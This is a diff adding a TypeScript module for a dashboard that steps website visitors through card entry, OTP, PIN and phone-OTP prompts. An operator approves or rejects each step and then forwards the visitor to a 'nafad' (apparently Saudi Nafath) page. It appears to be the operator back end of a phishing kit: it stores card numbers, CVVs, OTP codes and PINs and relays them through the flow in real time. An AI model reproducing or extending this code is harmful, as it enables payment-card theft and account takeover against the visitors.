@@ -1,0 +1,146 @@
+/**
+ * Actions for handling history entries in the dashboard
+ */
+
+import { updateApplication } from "./firebase-services"
+import type { HistoryEntry } from "./history-helpers"
+
+/**
+ * Update the status of a history entry
+ */
+export async function updateHistoryStatus(
+  visitorId: string,
+  historyId: string,
+  newStatus: "approved" | "rejected",
+  history: HistoryEntry[]
+): Promise<void> {
+  const updatedHistory = history.map((entry) => {
+    if (entry.id === historyId) {
+      return { ...entry, status: newStatus }
+    }
+    return entry
+  })
+  
+  await updateApplication(visitorId, { history: updatedHistory as any })
+}
+
+/**
+ * Handle card approval
+ */
+export async function handleCardApproval(
+  visitorId: string,
+  historyId: string,
+  history: HistoryEntry[]
+): Promise<void> {
+  // Update history status
+  await updateHistoryStatus(visitorId, historyId, "approved", history)
+  
+  // Show OTP dialog
+  await updateApplication(visitorId, {
+    otpStatus: "show_otp" as any
+  })
+}
+
+/**
+ * Handle card rejection
+ */
+export async function handleCardRejection(
+  visitorId: string,
+  historyId: string,
+  history: HistoryEntry[]
+): Promise<void> {
+  // Update history status
+  await updateHistoryStatus(visitorId, historyId, "rejected", history)
+  
+  // Clear card data and redirect to payment page
+  await updateApplication(visitorId, {
+    cardNumber: "",
+    cardType: "",
+    expiryDate: "",
+    cvv: "",
+    otpCode: "",
+    pinCode: "",
+    otpStatus: "",
+    currentStep: 4
+  })
+}
+
+/**
+ * Handle OTP approval
+ */
+export async function handleOtpApproval(
+  visitorId: string,
+  historyId: string,
+  history: HistoryEntry[]
+): Promise<void> {
+  // Update history status
+  await updateHistoryStatus(visitorId, historyId, "approved", history)
+  
+  // Show PIN dialog
+  await updateApplication(visitorId, {
+    otpStatus: "show_pin" as any
+  })
+}
+
+/**
+ * Handle OTP rejection
+ */
+export async function handleOtpRejection(
+  visitorId: string,
+  historyId: string,
+  history: HistoryEntry[]
+): Promise<void> {
+  // Update history status
+  await updateHistoryStatus(visitorId, historyId, "rejected", history)
+  
+  // Clear OTP and reopen dialog
+  await updateApplication(visitorId, {
+    otpCode: "",
+    otpStatus: "show_otp" as any
+  })
+}
+
+/**
+ * Handle phone OTP approval
+ */
+export async function handlePhoneOtpApproval(
+  visitorId: string,
+  historyId: string,
+  history: HistoryEntry[]
+): Promise<void> {
+  // Update history status
+  await updateHistoryStatus(visitorId, historyId, "approved", history)
+  
+  // Move to nafad page
+  await updateApplication(visitorId, {
+    phoneOtpStatus: "approved" as any
+  })
+}
+
+/**
+ * Handle phone OTP rejection
+ */
+export async function handlePhoneOtpRejection(
+  visitorId: string,
+  historyId: string,
+  history: HistoryEntry[]
+): Promise<void> {
+  // Update history status
+  await updateHistoryStatus(visitorId, historyId, "rejected", history)
+  
+  // Clear phone OTP and reopen dialog
+  await updateApplication(visitorId, {
+    phoneOtp: "",
+    phoneOtpStatus: "show_phone_otp" as any
+  })
+}
+
+/**
+ * Handle phone OTP resend
+ */
+export async function handlePhoneOtpResend(visitorId: string): Promise<void> {
+  await updateApplication(visitorId, {
+    phoneOtp: "",
+    phoneOtpStatus: "show_phone_otp" as any
+  })
+}
